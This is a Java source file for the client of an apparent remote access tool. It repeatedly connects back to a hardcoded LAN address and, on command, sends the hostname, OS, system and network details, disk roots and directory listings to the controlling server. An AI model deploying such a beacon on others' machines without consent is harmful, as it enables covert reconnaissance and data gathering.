package Client;

import Client.Tree.Tree;
import Client.InformationGathering.SystemInformation;
import Client.InformationGathering.SystemNetworkInformation;

import javax.swing.*;
import java.io.*;
import java.net.*;
import java.nio.file.Path;
import java.util.Arrays;


public class Client {
    private static final String IP = "192.168.1.133";
    private static final int PORT = 3055;

    public static void main(String[] args) {

        while (true) {

        try {
            System.out.println("Conectando...");
            Socket s = new Socket(IP, PORT);

            System.out.println("Conectado");


            ObjectOutputStream output = new ObjectOutputStream(s.getOutputStream());
            PrintWriter writer = new PrintWriter(s.getOutputStream());
            BufferedReader reader = new BufferedReader(new InputStreamReader(s.getInputStream()));

            while (true) {
                String sel = reader.readLine();

                if ("PING".equals(sel) || "IP".equals(sel)) {
                    writer.println(s.getRemoteSocketAddress());
                    writer.flush();
                } else if ("CLOSE".equals(sel)) {
                    s.close();
                    return;
                } else if ("PC_NAME".equals(sel)) {
                    InetAddress addr = InetAddress.getLocalHost();
                    writer.println(addr.getHostName());
                    writer.flush();
                } else if ("OS".equals(sel)) {
                    writer.println(System.getProperty("os.name"));
                    writer.flush();
                } else if (sel.startsWith("TREE")) {
                    new Thread(new Tree(new File(sel.substring(4)), s)).start();
                } else if ("SYS_DETAILS".equals(sel)) {
                    output.writeObject(new Object[]{new SystemNetworkInformation(), new SystemInformation()});
                } else if ("DISKS".equals(sel)) {
                    File[] files = File.listRoots();
                    String[] rutas = new String[files.length];
                    for (int i = 0; i < files.length; i++) {
                        rutas[i] = files[i].toString();
                    }
                    new ObjectOutputStream(s.getOutputStream()).writeObject(rutas);
                }
            }
        } catch (ConnectException e) {
            System.out.println("Connection refused");
        } catch (SocketException ignored) {
            System.out.println("Connection reset");
        } catch (IOException e) {
            e.printStackTrace();
        }

        }

}

}